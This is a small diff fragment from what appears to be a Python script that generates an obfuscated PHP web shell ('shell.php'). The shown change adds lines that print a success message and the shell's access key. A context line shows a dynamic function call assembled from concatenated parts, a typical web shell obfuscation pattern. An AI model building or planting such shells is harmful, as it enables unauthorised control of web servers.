@@ -38,6 +38,9 @@ $func($p_1.$p_2.$p_3);
 ?>"""
         f.write(statement)
         f.close()
+    
+    print("\033[32m[+] Generate shell.php successfully!\033[0m")
+    print(f"\033[32m[+] shell_key={keys}\033[0m")
 
 
 if __name__ == "__main__":
